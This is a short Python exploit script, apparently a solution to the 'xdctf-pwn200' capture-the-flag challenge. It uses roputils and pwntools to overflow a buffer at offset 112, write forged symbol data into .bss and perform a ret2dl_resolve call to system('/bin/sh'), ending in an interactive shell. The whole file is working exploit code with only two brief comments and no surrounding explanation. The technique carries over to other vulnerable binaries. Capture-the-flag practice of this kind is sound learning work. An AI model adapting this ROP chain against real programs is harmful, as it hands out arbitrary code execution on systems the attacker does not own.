from roputils import *
from pwn import process

binary = 'xdctf-pwn200'
r = process(binary)

rop = ROP(binary)

offset = 112
bss_base = rop.section('.bss')

buf = rop.fill(offset)
buf += rop.call('read', 0, bss_base, 100)
# after using read to construct our symtab in .bss + 20, we use dl_resolve to call it
buf += rop.dl_resolve_call(bss_base + 20, bss_base)
r.send(buf)

# over here we just fill in .bss with the data we need
buf = rop.string('/bin/sh')
buf += rop.fill(20, buf)
buf += rop.dl_resolve_data(bss_base + 20, 'system')
r.send(buf)

r.interactive() 
